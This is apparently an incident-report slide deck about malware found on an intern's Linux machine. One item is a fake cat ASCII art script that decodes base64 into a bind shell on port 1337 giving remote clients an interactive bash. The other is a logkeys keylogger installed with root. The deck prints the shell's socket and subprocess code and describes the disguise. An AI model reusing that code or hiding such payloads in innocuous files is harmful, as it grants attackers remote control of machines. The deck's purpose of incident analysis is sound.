---
title: "Malware on the Intern's Machine"
format:
    revealjs:
        incremental: false
        theme: dark
        #center: true
execute:
  freeze: false
---

# Overview

* `cute_cat_ascii_art_generator.py`
    * Reverse shell
* logkeys
    * Linux keylogger


# Reverse Shell

```
# Our special kitty code (it makes the CUTEST kitties in the background!)
kitty_code = "omited for brevity""
kitty_recipe = base64.b64decode(kitty_code).decode('utf-8')
```

Decodes base64 obfuscated code, saves it to a file.

# Reverse Shell (cont.)

Base64 code, deobfuscated. Much of it is ommitted for brevity.

```
def main():
    # Create the socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Bind to all interfaces on port 1337
    try:
        server.bind(('0.0.0.0', 1337))
        server.listen(5)

    # Main loop to accept connections
    while True:
        try:
            client, addr = server.accept()

            # Send the splash text
            client.send(splash.encode() + b'\n')

            # Start a shell for the client
            process = subprocess.Popen(
                ["/bin/bash", "-i"],
                stdin=client,
                stdout=client,
                stderr=client
            )
```

# Reverse Shell Impact/Mitigations
* Was not running
* Software was deleted

# Keylogger

* <https://github.com/kernc/logkeys>
* Simple Linux Keylogger
* git repository (and zipped version) was found in the home dir

# Keylogger Impact/Mitigations

* Service was stopped and the software was removed
* Was active and logging to /var/log
* No data was exfiltrated
* Intern user no longer has privilege escalation permissions

# Keylogger Install

From the [logkeys install instructions](https://github.com/kernc/logkeys/blob/master/INSTALL)

```
$ make
$ su               # get root to install in system
$ make install     # installs binaries, manuals and scripts
```

* Root is required
* Intern user had root access, and these commands were in there history